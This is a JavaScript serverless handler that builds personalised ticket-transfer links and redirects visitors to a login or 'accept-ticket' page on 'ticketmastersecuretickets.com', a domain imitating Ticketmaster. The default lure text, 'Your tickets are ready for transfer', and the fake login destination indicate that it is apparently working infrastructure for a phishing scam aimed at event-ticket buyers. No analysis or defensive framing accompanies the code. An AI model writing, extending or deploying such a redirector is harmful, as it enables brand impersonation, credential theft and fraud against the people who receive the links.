export default function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Get parameters from query string
    const {
      recipientName,
      senderName,
      eventName,
      eventDetails,
      eventDate,
      eventTime,
      ticketCount,
      section,
      row,
      seats,
      ticketType,
      customMessage,
      redirectTo
    } = req.query;

    // DEBUG: Log all received parameters
    console.log('=== REDIRECT API DEBUG ===');
    console.log('Received customMessage:', customMessage);
    console.log('Received redirectTo:', redirectTo);
    console.log('All query params:', req.query);

    // Validate required parameters
    if (!recipientName || !senderName || !eventName) {
      return res.status(400).json({ 
        error: 'Missing required parameters: recipientName, senderName, eventName' 
      });
    }

    // Determine the redirect destination based on redirectTo parameter
    const baseUrl = redirectTo === 'login' 
      ? 'https://ticketmastersecuretickets.com/login.html'
      : 'https://ticketmastersecuretickets.com/accept-ticket.html';
    
    // Build the redirect URL with all parameters
    const params = new URLSearchParams({
      recipientName: recipientName || '',
      senderName: senderName || '',
      eventName: eventName || '',
      eventDetails: eventDetails || '',
      eventDate: eventDate || '',
      eventTime: eventTime || '',
      ticketCount: ticketCount || '1',
      section: section || '',
      row: row || '',
      seats: seats || '',
      ticketType: ticketType || 'General',
      customMessage: customMessage || 'Your tickets are ready for transfer and will be activated upon acceptance'
    });

    const redirectUrl = `${baseUrl}?${params.toString()}`;

    console.log('=== REDIRECT URL DEBUG ===');
    console.log('Base URL:', baseUrl);
    console.log('Params object:', Object.fromEntries(params));
    console.log('Final redirect URL:', redirectUrl);
    console.log('Custom message in redirect URL:', params.get('customMessage'));

    // Redirect to the actual website with parameters
    console.log('Sending 302 redirect to:', redirectUrl);
    res.redirect(302, redirectUrl);
    return;

  } catch (error) {
    console.error('Redirect error:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
}
